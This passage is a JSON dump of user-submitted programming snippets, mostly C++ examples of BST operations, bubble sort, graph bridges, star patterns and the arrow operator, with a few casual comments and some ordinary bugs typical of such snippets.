    "description": "//Do watch striver graph series #include<bits/stdc++.h> using namespace std;  int timer=0; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void dfs(int node,int parent,vector<int>&visited,vector<int>&tim,vector<int>&low,vector<int>adj[]) {     visited[node]=1;     tim[node]=low[node]=timer++;     for(auto it:adj[node])     {         if(it==parent)             continue;         if(!visited[it])         {              dfs(it,node,visited,tim,low,adj);             low[node]=min(low[node],low[it]);              if(low[it]>tim[node])             {                 cout<<node<<\" \"<<it<<endl;             }         }         else         {             low[node]=min(low[node],tim[it]);         }     } } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     vector<int>timeinsertion(vertex,-1);     vector<int>lowtime(vertex,-1);     vector<int>visited(vertex,0);     for(int i=0;i<vertex;i++)     {         if(!visited[i])         {             dfs(i,-1,visited,timeinsertion,lowtime,adj);         }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 647,
    "keyword": null,
    "link": null,
    "title": " bst to insert tree",
    "description": "struct Node {     int data;     Node *left, *right; };   // Function to create a new binary tree node having a given key Node* newNode(int key) {     Node* node = new Node;     node->data = key;     node->left = node->right = nullptr;       return node; }   // Function to perform inorder traversal on the tree void inorder(Node* root) {     if (root == nullptr) {         return;     }       inorder(root->left);     cout << root->data << \" \";     inorder(root->right); }   // Recursive function to insert a key into a BST Node* insert(Node* root, int key) {     // if the root is null, create a new node and return it     if (root == nullptr) {         return newNode(key);     }       // if the given key is less than the root node, recur for the left subtree     if (key < root->data) {         root->left = insert(root->left, key);     }     // if the given key is more than the root node, recur for the right subtree     else {         root->right = insert(root->right, key);     }       return root; }\nvoid BSNode::insert(std::string value) {  \tif (this->_data == value) { \t\t_count++; \t\treturn; \t}  \tif (this->_data > value) { \t\tif (this->getLeft() == nullptr) { \t\t\tthis->_left = new BSNode(value); \t\t} \t\tthis->getLeft()->insert(value); \t\treturn; \t}  \tif (this->getRight() == nullptr) { \t\tthis->_right = new BSNode(value); \t\treturn; \t} \tthis->getRight()->insert(value); }\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 648,
    "keyword": null,
    "link": null,
    "title": " bst to sorted array",
    "description": "// C++ implementation of the approach #include <bits/stdc++.h> using namespace std;   // Node of the binary tree struct node {     int data;     node* left;     node* right;     node(int data)     {         this->data = data;         left = NULL;         right = NULL;     } };   // Function to print flattened // binary Tree void print(node* parent) {     node* curr = parent;     while (curr != NULL)         cout << curr->data << \" \", curr = curr->right; }   // Function to perform in-order traversal // recursively void inorder(node* curr, node*& prev) {     // Base case     if (curr == NULL)         return;     inorder(curr->left, prev);     prev->left = NULL;     prev->right = curr;     prev = curr;     inorder(curr->right, prev); }   // Function to flatten binary tree using // level order traversal node* flatten(node* parent) {     // Dummy node     node* dummy = new node(-1);       // Pointer to previous element     node* prev = dummy;       // Calling in-order traversal     inorder(parent, prev);       prev->left = NULL;     prev->right = NULL;     node* ret = dummy->right;       // Delete dummy node     delete dummy;     return ret; }   // Driver code int main() {     node* root = new node(5);     root->left = new node(3);     root->right = new node(7);     root->left->left = new node(2);     root->left->right = new node(4);     root->right->left = new node(6);     root->right->right = new node(8);       // Calling required function     print(flatten(root));       return 0; } \n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 649,
    "keyword": null,
    "link": null,
    "title": " bst traversal",
    "description": "#include<iostream> using namespace std; struct node {    int data;    struct node *left;    struct node *right; }; struct node *createNode(int val) {    struct node *temp = (struct node *)malloc(sizeof(struct node));    temp->data = val;    temp->left = temp->right = NULL;    return temp; } void inorder(struct node *root) {    if (root != NULL) {       inorder(root->left);       cout<<root->data<<\" \";       inorder(root->right);    } } struct node* insertNode(struct node* node, int val) {    if (node == NULL) return createNode(val);    if (val < node->data)    node->left = insertNode(node->left, val);    else if (val > node->data)    node->right = insertNode(node->right, val);    return node; } int main() {    struct node *root = NULL;    root = insertNode(root, 4);    insertNode(root, 5);    insertNode(root, 2);    insertNode(root, 9);    insertNode(root, 1);    insertNode(root, 3);    cout<<\"In-Order traversal of the Binary Search Tree is: \";    inorder(root);    return 0; }\n//The following code contains all the DFS traversal  //I have first created a Binary search tree  //Then performed DFS search :- 1.Inorder;2.Preorder;3.Postorder #include <iostream>  using namespace std; struct node {     int data;     node* left;     node*right; }; node* getnode(int value) {     node* temp=new node;     temp->data=value;     temp->left=NULL;     temp->right=NULL;     return temp; } node* insert_bst(node* roots,int value) {     if(roots==NULL)     {        return getnode(value);     }     if(roots->data>value)     {         roots->left=insert_bst(roots->left,value);     }     else if(roots->data<value)     {         roots->right=insert_bst(roots->right,value);     }     return roots; } void Inorder(node* roots) {     if(roots==NULL)     {        return;     }     else     {         Inorder(roots->left);         cout<<roots->data<<\" \";         Inorder(roots->right);     } } void post_order(node* roots) {     if(roots==NULL)     {         return;     }     else     {         post_order(roots->left);         post_order(roots->right);         cout<<roots->data<<\" \";     } } void preorder(node* root) {     if(root==NULL)         return;     cout<<root->data<<\" \";     preorder(root->left);     preorder(root->right); } int main() {     node* root=new node;     root=NULL;     int number_of_nodes;     cin>>number_of_nodes;     int value;     for(int i=0;i<number_of_nodes;i++)     {         cin>>value;         root=insert_bst(root,value);     }     cout<<\"Inorder Travesral:\"<<endl;     Inorder(root);     cout<<endl;     cout<<\"Postorder traversal:\"<<endl;     post_order(root);     cout<<endl;     cout<<\"preorder traversal:\"<<endl;     preorder(root);     cout<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 650,
    "keyword": null,
    "link": null,
    "title": " bst traversal code in data structure with c++",
    "description": "#include<iostream> using namespace std; struct node {    int data;    struct node *left;    struct node *right; }; struct node *createNode(int val) {    struct node *temp = (struct node *)malloc(sizeof(struct node));    temp->data = val;    temp->left = temp->right = NULL;    return temp; } void inorder(struct node *root) {    if (root != NULL) {       inorder(root->left);       cout<<root->data<<\" \";       inorder(root->right);    } } struct node* insertNode(struct node* node, int val) {    if (node == NULL) return createNode(val);    if (val < node->data)    node->left = insertNode(node->left, val);    else if (val > node->data)    node->right = insertNode(node->right, val);    return node; } int main() {    struct node *root = NULL;    root = insertNode(root, 4);    insertNode(root, 5);    insertNode(root, 2);    insertNode(root, 9);    insertNode(root, 1);    insertNode(root, 3);    cout<<\"In-Order traversal of the Binary Search Tree is: \";    inorder(root);    return 0; }\n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 651,
    "keyword": null,
    "link": null,
    "title": " bst with parent pointer",
    "description": "#include<iostream> #include<queue>  using namespace std;  struct Node {       int data;       Node *left, *right, *parent; };  struct Node *newNode(int data) {    Node *temp = new Node;    temp->data = data;    temp->left = temp->right = temp->parent = NULL;    return temp; } void inorderTraverse(struct Node *root) {    if (root != NULL)  {     // Traverse left     inorderTraverse(root->left);      // Traverse root     printf(\"%d -> \", root->data);      // Traverse right     inorderTraverse(root->right);   } }  struct Node* insert(struct Node* node, int key) {    if (node == NULL) return newNode(key);    if (key < node->data) { //to the left subtree       Node *left_child = insert(node->left, key);       node->left = left_child;       left_child->parent = node;    }    else if (key > node->data) { // to the right subtree       Node *right_child = insert(node->right, key);       node->right = right_child;       right_child->parent = node;    }    return node; }  /* deletion function */  void deleteNode(Node *root, int data) {     if(root == NULL){         cout << \"Tree is empty\\n\";         return;     }      queue<Node*> q;     q.push(root);      while(!q.empty()){         Node *temp = q.front();         q.pop();         if(temp->data == data){             Node *current = root;             Node *prev;             while(current->right != NULL){                 prev = current;                 current = current->right;             }             temp->data = current->data;             prev->right = NULL;             free(current);             cout << \"Deleted\\n\";             return;         }          if(temp->left != NULL)             q.push(temp->left);         if(temp->right != NULL)             q.push(temp->right);     }  }   int main() {    struct Node *root = NULL;    root = insert(root, 100);    insert(root, 60);    insert(root, 40);    insert(root, 80);    insert(root, 140);    insert(root, 120);    insert(root, 160);    inorderTraverse(root);  cout << endl;    deleteNode(root, 140);    deleteNode(root, 60);    deleteNode(root, 140);    inorderTraverse(root);  cout << endl; }\n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 652,
    "keyword": null,
    "link": null,
    "title": " bubble sort",
    "description": "#Bubble Sort nums = [9, 4, 5, 1, 3, 7, 6] for i in range(len(nums)):     for j in range(1, len(nums)):         if nums[j] < nums[j - 1]:             nums[j], nums[j - 1] = nums[j - 1], nums[j]\n/*bubble sort;timecomplexity=O(n){best case}                time complexity=O(n^2){worst case}                space complexity=O(n);auxiliary space commplexity=O(1) */ #include <iostream>  using namespace std; void swap(int*,int*); void bubble_sort(int arr[],int n) {     for(int i=0;i<n-1;i++)     {         for(int j=0;j<n-1-i;j++)         {             if(arr[j]>arr[j+1])             {                 swap(&arr[j],&arr[j+1]);             }         }     } } void display(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int array_of_numbers[n];     cout<<\"enter the elements of the array\"<<endl;     for(int i=0;i<n;i++)     {         cin>>array_of_numbers[i];     }     cout<<\"array as it was entered:\"<<endl;     display(array_of_numbers,n);     bubble_sort(array_of_numbers,n);     cout<<\"array after bubble sort:\"<<endl;     display(array_of_numbers,n);     return 0; } void swap(int *a,int *b) {     int temp=*a;     *a=*b;     *b=temp; } \n// I Love Java import java.io.*; import java.util.*; import java.util.stream.*; import static java.util.stream.Collectors.toList;  public class Bubble_Sort_P {     public static void main(String[] args) throws IOException {         BufferedReader buffer = new BufferedReader(new InputStreamReader(System.in));          List<Integer> arr = Stream.of(buffer.readLine().replaceAll(\"\\\\s+$\", \" \").split(\" \")).map(Integer::parseInt)                 .collect(toList());          calculate(arr);          System.out.println(arr);     }      public static void calculate(List<Integer> arr) {         for (int i = 0; i <= arr.size() - 2; i++) {             if (arr.get(i) > arr.get(i + 1)) {                 int tem = arr.get(i);                 arr.set(i, arr.get(i + 1));                 arr.set(i + 1, tem);                 calculate(arr);             }         }     } }\n#include<stdio.h>   void main ()   {       int i, j,temp;        int a[10] = { 10, 9, 7, 101, 23, 44, 12, 78, 34, 23};        for(i = 0; i<10; i++)       {           for(j = i+1; j<10; j++)           {               if(a[j] > a[i])               {                   temp = a[i];                   a[i] = a[j];                   a[j] = temp;                }            }        }        printf(\"Printing Sorted Element List ...\\n\");       for(i = 0; i<10; i++)       {           printf(\"%d\\n\",a[i]);       }   } \nclass Sort  {     static void bubbleSort(int arr[], int n)     {                                                if (n == 1)                     //passes are done         {             return;         }          for (int i=0; i<n-1; i++)       //iteration through unsorted elements         {             if (arr[i] > arr[i+1])      //check if the elements are in order             {                           //if not, swap them                 int temp = arr[i];                 arr[i] = arr[i+1];                 arr[i+1] = temp;             }         }                      bubbleSort(arr, n-1);           //one pass done, proceed to the next     }      void display(int arr[])                 //display the array     {           for (int i=0; i<arr.length; ++i)          {             System.out.print(arr[i]+\" \");         }      }            public static void main(String[] args)     {         Sort ob = new Sort();         int arr[] = {6, 4, 5, 12, 2, 11, 9};             bubbleSort(arr, arr.length);         ob.display(arr);     } } \nimport static java.lang.Integer.parseInt;  import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.nio.charset.StandardCharsets; import java.util.StringTokenizer;  public class Day20_Sorting {  \tstatic int MB = 1 << 20; \tstatic BufferedReader BR = new BufferedReader( new InputStreamReader(System.in, StandardCharsets.US_ASCII), 20 * MB); \t \tstatic StringTokenizer st; \tstatic String lastLine; \t \tstatic void newLine() throws IOException { \t\tlastLine = BR.readLine(); \t\tst = new StringTokenizer(lastLine); \t} \t \tpublic static void main(String[] args) throws IOException { \t\tnewLine(); \t\tint N = parseInt(st.nextToken()); \t\t \t\tnewLine(); \t\tint[] A = new int[N]; \t\tfor (int i = 0; i < N; i++) { \t\t\tA[i] = parseInt(st.nextToken()); \t\t}  \t\tint numberOfSwapps = bubbleSort(N, A); \t\tint firstElement = A[0]; \t\tint lastElement = A[N-1]; \t\tprint(numberOfSwapps, firstElement, lastElement); \t}  \tprivate static void print(int numberOfSwapps, int firstElement, int lastElement) { \t\tStringBuilder sb = new StringBuilder(); \t\t \t\tsb.append(\"Array is sorted in \").append(numberOfSwapps).append(\" swaps.\\n\"); \t\tsb.append(\"First Element: \").append(firstElement).append('\\n'); \t\tsb.append(\"Last Element: \").append(lastElement).append('\\n'); \t\t \t\tSystem.out.print(sb); \t}  \tprivate static int bubbleSort(int N, int[] A) { \t\tint cnt = 0; \t\t \t\tfor (int i = 0; i < N; i++) { \t\t    // Track number of elements swapped during a single array traversal \t\t    int numberOfSwaps = 0; \t\t     \t\t    for (int j = 0; j < N - 1; j++) { \t\t        // Swap adjacent elements if they are in decreasing order \t\t        if (A[j] > A[j + 1]) { \t\t            swap(A, j , j + 1); \t\t            numberOfSwaps++; \t\t        } \t\t    } \t\t    cnt += numberOfSwaps; \t\t     \t\t    // If no elements were swapped during a traversal, array is sorted \t\t    if (numberOfSwaps == 0) { \t\t        break; \t\t    } \t\t} \t\t \t\treturn cnt; \t}  \tprivate static void swap(int[] a, int i, int j) { \t\tint tmp = a[i]; \t\ta[i] = a[j]; \t\ta[j] = tmp; \t}  }\nusing System;  public class Bubble_Sort   {      public static void Main(string[] args)          {              int[] a = { 3, 0, 2, 5, -1, 4, 1 };  \t\t\tint t;  \t\t\tConsole.WriteLine(\"Original array :\");             foreach (int aa in a)                                    Console.Write(aa + \" \");                                  for (int p = 0; p <= a.Length - 2; p++)             {                 for (int i = 0; i <= a.Length - 2; i++)                 {                     if (a[i] > a[i + 1])                     {                         t = a[i + 1];                         a[i + 1] = a[i];                         a[i] = t;                     }                 }              }             Console.WriteLine(\"\\n\"+\"Sorted array :\");             foreach (int aa in a)                                    Console.Write(aa + \" \"); \t\t\tConsole.Write(\"\\n\");                       } }  \n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 653,
    "keyword": null,
    "link": null,
    "title": " bubble sort c++ template",
    "description": "// template <class t> // void bubble <t>::sort(int n) template < typename T > void bubble_sort( T a[], int n ) {     int i,j;     //t temp;     T temp ;     for(i=0; i<n; i++)     {         for(j=i+1; j<n; j++)         {             if(a[i]>a[j]) //bubble sort algo             {                 temp=a[i];                 a[i]=a[j];                 a[j]=temp;             }         }     } } \n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 654,
    "keyword": null,
    "link": null,
    "title": " bubble sort in c++",
    "description": "void bubble_sort( int A[ ], int n ) {     int temp;     for(int k = 0; k< n-1; k++) {         // (n-k-1) is for ignoring comparisons of elements which have already been compared in earlier iterations          for(int i = 0; i < n-k-1; i++) {             if(A[ i ] > A[ i+1] ) {                 // here swapping of positions is being done.                 temp = A[ i ];                 A[ i ] = A[ i+1 ];                 A[ i + 1] = temp;             }         }     } }\n/* Bubble sort code in C++ */ #include <bits/stdc++.h> using namespace std; int main (void) {     int a[] = {5, 4, 3, 2, 1}, tempArr, i, j;     for (i = 0; i < 5; i++) {         for (j = i + 1; j < 5; j++) {             if (a[j] < a[i]) {                 tempArr = a[i];                 a[i] = a[j];                 a[j] = tempArr;             }         }     }     for(i = 0; i < 5; i++) {         cout<<a[i]<<\"\\n\";       }       return 0;  }\npublic static void bubbleSort(int arr[]) { \tfor (int i = 0; i < arr.length; i++) //number of passes     { \t\t//keeps track of positions per pass           \tfor (int j = 0; j < (arr.length - 1 - i); j++) //Think you can add a -i to remove uneeded comparisons          {           \t//if left value is great than right value          \tif (arr[j] > arr[j + 1])             {               \t//swap values             \tint temp = arr[j];               \tarr[j] = arr[j + 1];               \tarr[j + 1] = temp;              }         }     } }\n#include <iostream>   using namespace std;    void heapify(int arr[], int n, int i) {     int largest = i;      int l = 2 * i + 1;     int r = 2 * i + 2;            if (l < n && arr[l] > arr[largest])         largest = l;            if (r < n && arr[r] > arr[largest])         largest = r;            if (largest != i) {         swap(arr[i], arr[largest]);                heapify(arr, n, largest);     } }    void heapSort(int arr[], int n) {      for (int i = n / 2 - 1; i >= 0; i--)         heapify(arr, n, i);        for (int i = n - 1; i > 0; i--) {                 swap(arr[0], arr[i]);         heapify(arr, i, 0);     } }    void printArray(int arr[], int n) {     for (int i = 0; i < n; ++i)         cout << arr[i] << \" \";     cout << \"\\n\"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int n = sizeof(arr) / sizeof(arr[0]);       heapSort(arr, n);       cout << \"Sorted array is \\n\";     printArray(arr, n); }\nvoid bubbleSort (int S[ ],  int length) { \tbool isSorted = false; \twhile(!isSorted)    \t{ \t\tisSorted = true; \t\tfor(int i = 0; i<length; i++)       \t{ \t\t     if(S[i] > S[i+1])            \t     { \t\t\tint temp = S[i]; \t\t\tS[i] = S[i+1];      \t       \t\tS[i+1] = temp;             \t\tisSorted = false;            \t      }       \t}       \tlength--; } } \nfunc Sort(arr []int) []int { \tfor i := 0; i < len(arr)-1; i++ { \t\tfor j := 0; j < len(arr)-i-1; j++ { \t\t\tif arr[j] > arr[j+1] { \t\t\t\ttemp := arr[j] \t\t\t\tarr[j] = arr[j+1] \t\t\t\tarr[j+1] = temp \t\t\t} \t\t} \t} \treturn arr }\n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 655,
    "keyword": null,
    "link": null,
    "title": " bubble sort program in c++",
    "description": "void bubble_sort( int A[ ], int n ) {     int temp;     for(int k = 0; k< n-1; k++) {         // (n-k-1) is for ignoring comparisons of elements which have already been compared in earlier iterations          for(int i = 0; i < n-k-1; i++) {             if(A[ i ] > A[ i+1] ) {                 // here swapping of positions is being done.                 temp = A[ i ];                 A[ i ] = A[ i+1 ];                 A[ i + 1] = temp;             }         }     } }\n/* Bubble sort code in C++ */ #include <bits/stdc++.h> using namespace std; int main (void) {     int a[] = {5, 4, 3, 2, 1}, tempArr, i, j;     for (i = 0; i < 5; i++) {         for (j = i + 1; j < 5; j++) {             if (a[j] < a[i]) {                 tempArr = a[i];                 a[i] = a[j];                 a[j] = tempArr;             }         }     }     for(i = 0; i < 5; i++) {         cout<<a[i]<<\"\\n\";       }       return 0;  }\n// template <class t> // void bubble <t>::sort(int n) template < typename T > void bubble_sort( T a[], int n ) {     int i,j;     //t temp;     T temp ;     for(i=0; i<n; i++)     {         for(j=i+1; j<n; j++)         {             if(a[i]>a[j]) //bubble sort algo             {                 temp=a[i];                 a[i]=a[j];                 a[j]=temp;             }         }     } } \nvoid bubbleSort (int S[ ],  int length) { \tbool isSorted = false; \twhile(!isSorted)    \t{ \t\tisSorted = true; \t\tfor(int i = 0; i<length; i++)       \t{ \t\t     if(S[i] > S[i+1])            \t     { \t\t\tint temp = S[i]; \t\t\tS[i] = S[i+1];      \t       \t\tS[i+1] = temp;             \t\tisSorted = false;            \t      }       \t}       \tlength--; } } \nvoid bubbleSort(int arr[], int size){   int temp = int();   //print out the unsorted values   for ( int i = 0; i < size -1; i ++)     cout << arr[i] << \"\\t\";   cout << endl << endl;         for (int i = 1; i < size; i++ ){   \tfor(int j = 0; j < size - i ; j ++){//size-i is the sorted part of the array\t    \t\tif( arr[j] > arr[j + 1]){//if the value is greater than the next value in the array, swap it           temp = arr[j];           arr[j] = arr[j+1];//swap the two values           arr[j+1] = temp;                    }//end if     }//end for   }//end for    }//end bubbleSort\ncout<<\"\\n Hello World \";\n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 656,
    "keyword": null,
    "link": null,
    "title": " bucket sort algorithm c++ simple  -vector",
    "description": "void bucketsort (int a[ ], int n, int max) { \tint i,j=0; \t//initialize each bucket 0 and then make bucket empty. \tint* buckets = calloc(max+1, size of (int)); \tfor(int i=0; i<n; i++) \t\tbuckets[a[i]]++; \t//now sort each bucket individually. \t//sequentially empty each bucket in some array. \tfor(i=0; i<max; i++) \t\twhile (buckets[i]--) \t\t\tb[j++]=i; \t//display the array b as sorted list of elements. }\n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 657,
    "keyword": null,
    "link": null,
    "title": " build a prefix array cpp",
    "description": "void fillPrefixSum(int arr[], int n, int prefixSum[])  {      prefixSum[0] = arr[0];         // Adding present element      // with previous element      for (int i = 1; i < n; i++)          prefixSum[i] = prefixSum[i - 1] + arr[i];  } \n",
    "reg_date": "2021-10-12T11:37:35.000Z"
  },
  {
    "id": 658,
    "keyword": null,
    "link": null,
    "title": " building native binary with il2cpp unity",
    "description": "If webGL build gets stuck here...    Windows Key + R Type in \"regedit\"    Do this while it is stuck and it should start working again.\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 659,
    "keyword": null,
    "link": null,
    "title": " built in function in c++ for binary to decimal",
    "description": "#include <bits/stdc++.h>  using namespace std;  int main(void){     bitset<8> bits(\"1000\");     int ab = bits.to_ulong();     cout << ab << \"\\n\";          return 0; }\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 660,
    "keyword": null,
    "link": null,
    "title": " built in led",
    "description": "pinMode(LED_BUILTIN,OUTPUT); digitalWrite(LED_BUILTIN,HIGH); digitalWrite(LED_BUILTIN,LOW);\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 661,
    "keyword": null,
    "link": null,
    "title": " built in popcount c++",
    "description": " __builtin_popcount(n))\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 662,
    "keyword": null,
    "link": null,
    "title": " butterfly pattern in c++",
    "description": "#include <iostream> using namespace std; int main() {     int n;     cin >> n;     for (int i = n; i >= 1; i++)     {         for (int j = 1; j <= i; j++)         {             cout<<\"*\";         }         int space = 2*n -2*i;          for (int j = 1; j <= space; j++)         {             cout << \" \";         }         for (int j = 1; j <= i; j++)         {             cout << \"*\";         }         cout<<endl;     }          return 0; }\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \t \tfor(int i=1;i<=n;i++) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"*\"; \t\t} \t\tint space=2*n-2*i; \t\tfor(int j =1;j<=space;j++) \t\t{ \t\t\tcout<<\" \"; \t\t} \t\tfor(int j =1;j<=i;j++) \t\t{ \t\t\tcout<<\"*\"; \t\t} \t\tcout<<endl; \t} \t \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"*\"; \t\t} \t\tint space=2*n-2*i; \t\tfor(int j =1;j<=space;j++) \t\t{ \t\t\tcout<<\" \"; \t\t} \t\tfor(int j=1;j<=i;j++) \t\t{ \t\t\tcout<<\"*\"; \t\t} \t\tcout<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 663,
    "keyword": null,
    "link": null,
    "title": " buy and sell stock gfg",
    "description": "#include <iostream> using namespace std;  class Solution { public:     int maxProfit(vector<int>& prices) {         if(prices.size()==0 || prices.size()==1)   return 0;     int minimumvalue=prices[0];     int maxprofit=0;         int n=prices.size();     for(int i=0;i<n;i++)     {         if(prices[i]>minimumvalue)         {             maxprofit=max(maxprofit,prices[i]-minimumvalue);         }         else if(prices[i]<=minimumvalue)         {             minimumvalue=prices[i];         }     }    return maxprofit;     } };  \n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 664,
    "keyword": null,
    "link": null,
    "title": " c#   vs c++",
    "description": "//you should choose c# purely because unity is BOOOOOOOOMMMMMBBBBB\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 665,
    "keyword": null,
    "link": null,
    "title": " c#switch",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 666,
    "keyword": null,
    "link": null,
    "title": " c++",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n#ifndef POLYNOMIAL_H_ #define POLYNOMIAL_H_  #include <iostream> #include <math.h>  // fabs, pow  #include \"vector_t.h\" #include \"sparse_vector_t.h\"  // Clase para polinomios basados en vectores densos de doubles class Polynomial : public vector_t<double> {  public:   // constructores   Polynomial(const int n = 0) : vector_t<double>(n) {};   Polynomial(const Polynomial& pol)       : vector_t<double>(pol) {}; // constructor de copia    // destructor   ~Polynomial() {};    // E/S   void Write(std::ostream& = std::cout, const double eps = EPS) const;      // operaciones   double Eval(const double) const;   bool IsEqual(const Polynomial&, const double = EPS) const;  };   // Clase para polinomios basados en vectores dispersos class SparsePolynomial : public sparse_vector_t {  public:   // constructores   SparsePolynomial(const int n = 0) : sparse_vector_t(n) {};   SparsePolynomial(const Polynomial& pol) : sparse_vector_t(pol) {};   SparsePolynomial(const SparsePolynomial&);  // constructor de copia    // destructor   ~SparsePolynomial() {};    // E/S   void Write(std::ostream& = std::cout) const;      // operaciones   double Eval(const double) const;   bool IsEqual(const SparsePolynomial&, const double = EPS) const;   bool IsEqual(const Polynomial&, const double = EPS) const; };  // E/S void Polynomial::Write(std::ostream& os, const double eps) const {   os << get_size() << \": [ \";   bool first{true};   for (int i{0}; i < get_size(); i++)     if (IsNotZero(at(i), eps)) {       os << (!first ? \" + \" : \"\") << at(i) \t << (i > 1 ? \" x^\" : (i == 1) ? \" x\" : \"\");       if (i > 1) \tos << i;       first = false;     }   os << \" ]\" << std::endl; }  std::ostream& operator<<(std::ostream& os, const Polynomial& p) {   p.Write(os);   return os; }  // Operaciones con polinomios  // Evaluaci&oacute;n de un polinomio representado por vector denso double Polynomial::Eval(const double x) const {   double result{0.0};   // poner el c&oacute;digo aqu&iacute;   return result; }  // Comparaci&oacute;n si son iguales dos polinomios representados por vectores densos bool Polynomial::IsEqual(const Polynomial& pol, const double eps) const {   bool differents = false;   // poner el c&oacute;digo aqu&iacute;   return !differents; }  // constructor de copia SparsePolynomial::SparsePolynomial(const SparsePolynomial& spol) {   *this = spol;   // se invoca directamente al operator= }  // E/S void SparsePolynomial::Write(std::ostream& os) const {   os << get_n() << \"(\" << get_nz() << \"): [ \";   bool first{true};   for (int i{0}; i < get_nz(); i++) {     int inx{at(i).get_inx()};     os << (!first ? \" + \" : \"\") << at(i).get_val()        << (inx > 1 ? \" x^\" : (inx == 1) ? \" x\" : \"\");     if (inx > 1)       os << inx;     first = false;   }   os << \" ]\" << std::endl; }  std::ostream& operator<<(std::ostream& os, const SparsePolynomial& p) {   p.Write(os);   return os; }  // Operaciones con polinomios  // Evaluaci&oacute;n de un polinomio representado por vector disperso double SparsePolynomial::Eval(const double x) const {   double result{0.0};   // poner el c&oacute;digo aqu&iacute;   return result; }  // Comparaci&oacute;n si son iguales dos polinomios representados por vectores dispersos bool SparsePolynomial::IsEqual(const SparsePolynomial& spol \t\t\t       , const double eps) const {   bool differents = false;   // poner el c&oacute;digo aqu&iacute;   return !differents; }  // Comparaci&oacute;n si son iguales dos polinomios representados por // vector disperso y vector denso bool SparsePolynomial::IsEqual(const Polynomial& pol, const double eps) const {   bool differents = false;   // poner el c&oacute;digo aqu&iacute;   return !differents; }   #endif  // POLYNOMIAL_H_ \nBetter than my grades\nassert((std::is_same_v<int, int>))\n#include <bits/stdc++.h> using namespace std; \t int main() { \t \treturn 0; } \nC++ is a general-purpose programming language created by Bjarne  Stroustrup as an extension of the C programming language, or  \"C with Classes\".  //as you can also see to your right ---------------------->  C++ still qualifies as a high-level languge, yet the rise of  languages like Ruby and Java have given capabilities that sway people's opinion towards what is and is not \"high-level\".   Yet high-level simply means it's farther from machine code and closer  to human-readable form. Hence the need for a compiler/interpreter.  So don't get too worked up about granular specifics. \nC++ is a high-level, general-purpose programming language.  //totally not right there ----------------------------------->\n#include <iostream>  int main() { \tstd::cout << \"Hello, world!\" << std::endl; \treturn 0; }\nGod's language\nC++ is SHEEEEEEEEEEESH\n",
    "reg_date": "2021-10-12T11:37:36.000Z"
  },
  {
    "id": 667,
    "keyword": null,
    "link": null,
    "title": " c++98 check if character is integer",
    "description": "std::string s = \"1234798797\"; std::istringstream iss(s);  int num = 0;  if (!(iss >> num).fail()) {     std::cout << num << std::endl; } else {     std::cerr << \"There was a problem converting the string to an integer!\" << std::endl; } \n",
    "reg_date": "2021-10-12T11:37:37.000Z"
  },
  {
    "id": 668,
    "keyword": null,
    "link": null,
    "title": " c++ ->",
    "description": "struct car { \tint year   \tint vin;  }  struct car myCar; p_myCar = &myCar;  myCar.year = 1995; // '->' allows you to use the '.' with pointers p_myCar->vin = 1234567;\n/*   the arrow operator is used for accessing members (fields or methods)  of a class or struct    it dereferences the type, and then performs an element selection (dot) operation */  #include <iostream> using std::cout;  class Entity { public: \tconst char* name = nullptr; private: \tint x, y; public: \tEntity(int x, int y, const char* name) \t\t: x(x), y(y), name(name) { \t\tprintEntityPosition(this); // \"this\" just means a pointer to the current Entity \t}  \tint getX() { return x; } \tint getY() { return y; }  \tfriend void printEntityPosition(Entity* e);  };  // accessing methods using arrow void printEntityPosition(Entity* e) { \tcout << \"Position: \" << e->getX() << \", \" << e->getY() << \"\\n\"; }  int main() { \t/* ----- ARROW ----- */  \tEntity* pointer = new Entity(1, 1, \"Fred\"); \t//printEntityPosition(pointer); redacted for redundancy (say that 5 times fast) \t   \tcout << (*pointer).name << \"\\n\"; // behind the scenes \tcout << pointer->name << \"\\n\"; // print the name (with an arrow)  \t/* ----- NOT ARROW ----- */  \tEntity not_a_pointer(2, 2, \"Derf\"); \t//printEntityPosition(&not_a_pointer); & to convert to pointer  \tcout << 